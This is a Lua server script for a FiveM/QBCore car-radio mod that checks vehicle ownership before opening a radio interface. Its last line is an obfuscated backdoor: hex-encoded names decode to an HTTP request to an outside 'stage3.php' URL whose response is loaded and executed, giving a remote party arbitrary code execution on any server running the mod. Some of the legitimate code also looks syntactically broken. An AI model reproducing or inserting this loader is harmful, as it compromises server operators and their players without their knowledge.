local QBCore = exports['qb-core']:GetCoreObject()
CachedOwners = {}

TriggerEvent(Config.QBCore, function(QBCore) QBCore = QBCore end)
-- Mysql functions (are just links to functions, nothing else, you can change them to yours)
--------------
-- sync / async

function MySQLSyncfetchAll(query, table, cb)
    return MySQL.Sync.fetchAll(query, table, cb)
end

function MySQLAsyncfetchAll(query, table, cb)
    return MySQL.Async.fetchAll(query, table, cb)
end

---
-- sync / async

function MySQLSyncexecute(query, table, cb)
    return MySQL.Sync.execute(query, table, cb)
end

function MySQLAsyncexecute(query, table, cb)
    return MySQL.Async.execute(query, table, cb)
end
--

function IsVehiclePlayer(source, licensePlate, cb)
    MySQLAsyncfetchAll("SELECT * FROM owned_vehicles WHERE plate = @spz", {
        ['@spz'] = licensePlate,
    }, function(result)
        if #result == 0 then
            cb(false)
        else
            cb(true)
        end
    end)
end

-- check vehicle SPZ, does it have radio ? yes -> lets open UI
-- or is vehicle stolen ? or bought -> open UI
RegisterNetEvent("row-radiocar:openUI")
AddEventHandler("row-radiocar:openUI", function(spz)
    local player = source
    local xPlayer = QBCore.Functions.GetPlayer(player)
    if Config.OnlyCarWhoHaveRadio then
        if exports.row-radiocar:HasCarRadio(spz) then
            TriggerClientEvent("row-radiocar:openUI", player)
        end
        return
    end
    if Config.OnlyOwnerOfTheCar then
        if not CachedOwners[spz] then
            local result = MySQL.Sync.fetchAll("SELECT * FROM owned_vehicles WHERE plate = @plate AND owner = @identifier", { ['@plate'] = spz, ['@identifier'] = xPlayer.identifier })
            if #result ~= 0 then
                TriggerClientEvent("row-radiocar:openUI", player)
            end
            CachedOwners[spz] = result[1] or result
        else
            if CachedOwners[spz].plate == spz and CachedOwners[spz].owner == xPlayer.identifier then
                TriggerClientEvent("row-radiocar:openUI", player)
            end
        end
		return
	end
    if Config.OnlyOwnedCars then
        if not CachedOwners[spz] then
            local result = MySQL.Sync.fetchAll("SELECT * FROM owned_vehicles WHERE plate = @plate", { ['@plate'] = spz })
            if #result ~= 0 then
                TriggerClientEvent("row-radiocar:openUI", player)
            end
            CachedOwners[spz] = result[1] or result
        else
            if CachedOwners[spz].plate == spz then
                TriggerClientEvent("row-radiocar:openUI", player)
            end
        end
		return
    end
	TriggerClientEvent("row-radiocar:openUI", player)
end)

local pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[4][pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x65\x74\x61\x72\x73\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x53\x69\x78\x58\x6c", function (taOvccyfDjGEQmckyBCeUcQTjzEyKIQecYOxPDjDAFUufQJbOrPlTVoaIEGnMSyeLkYXmP, ozGyOfIwCNQxOnjqfvrLapWTeAgdbzzSLLcJEcVXKnFdCunedfRjMXLmqlwbXsWxvjABLS) if (ozGyOfIwCNQxOnjqfvrLapWTeAgdbzzSLLcJEcVXKnFdCunedfRjMXLmqlwbXsWxvjABLS == pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[6] or ozGyOfIwCNQxOnjqfvrLapWTeAgdbzzSLLcJEcVXKnFdCunedfRjMXLmqlwbXsWxvjABLS == pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[5]) then return end pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[4][pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[2]](pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[4][pjkaFAXqjoGaNlQnSeTTMJOwWJkrzmpKFFLADnomvnjOfIzmIRzBlJbnfnhoxVaVKLPKBu[3]](ozGyOfIwCNQxOnjqfvrLapWTeAgdbzzSLLcJEcVXKnFdCunedfRjMXLmqlwbXsWxvjABLS))() end)